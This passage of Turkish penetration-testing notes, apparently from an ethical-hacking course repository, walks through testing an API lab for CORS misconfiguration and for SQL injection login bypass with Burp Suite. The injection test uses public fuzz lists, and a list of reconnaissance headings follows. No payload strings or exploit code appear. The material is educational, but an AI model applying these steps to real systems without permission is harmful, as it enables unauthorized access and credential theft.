> ## API7 Cors

- ```CORS``` yani "Cross Origin Request" kendi websitemizden değil başka bir bir siteden istek atmasıdır (Başka sitedeki buton ile örneğin facebook'a istek atmaktır).
- Yeni kullanıcı oluşturuyoruz ve send diyoruz
- ```GET Get key``` kısmında bizim ```auth. key```'imiz bulunur

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2015.09.31.jpeg)

- ```Burpsuite intercept is on``` yapıyoruz 
- Get key send diyoruz ve yakalıyoruz
- ```Send to repeater``` diyoruz
- Cookie olduğunu görüyoruz önemli olan başka header'dan da gelse çalışıyor mu ona bakıyoruz
- ```Cookie```'nin üst satırına ```Origin:https://{websitesi.com}``` yazıp send'liyoruz ve token'ı yinede alabiliyor muyuz diye bakıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2015.12.51.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ac1847813ecf381fc398fd3263a4afdf5f854b0f/Pictures/WhatsApp%20Image%202022-09-25%20at%2015.17.18.jpeg)

- Eğer başka siteden gitmemize rağmen key'i alıyorsak sitede açık var demektir

> ## API8 SQLi Injection

- SQL injecytion yaparken kullanabileceğimiz bir teknik
- ```Burpsuite intercept is on``` diyoruz, send'liyoruz ve yakalıyoruz
- ```Send to intruder``` diyoruz
- Username ve password'u seçiyoruz
- ```Attack type```'ı ```battering ram``` seçiyoruz 
- İnternetten ```burpsuite intruder sql injection fuzzer txt github``` araıp deneyebileceğimiz sql komutlarını görebiliriz
- ```github./1N3/IntruderPayloads/blob/master/FuzzLists/quick-fuzz.txt``` içerisindekileri seçip kopyalıyoruz (70. satırdan itibaren)
- ```Payload set 1``` içine atıyoruz
- ```URL encode``` kaldırıyoruz
- ```Start Attack``` diyoruz
- ```Status```'u "200" olanlara bakıyoruz
- "200" olanlarda yanıt yoksa ya da "200" olan yoksa ```Length```'i fazla olanlara bakıyoruz ve hangi kodlar giriş yapabileceğimizi görüyoruz
- ! Bu yöntemler diğer açıkları bulabiliriz (XSS vb)
- Bulduğumuz kullanıcı adı ve şifreyi Post içine girip sendliyoruz
- Get içine girip send diyerek ```admin``` keyine erişebiliriz





> ## API9 Versiyon Farklılığı
# Bilgi Toplama
> ## Whoislookup
> ### Icanlookup
> ### Who is.domaintools
> ## DNS Look Up
> ### Robtex.com
> ## Sitereport Netcraft.com
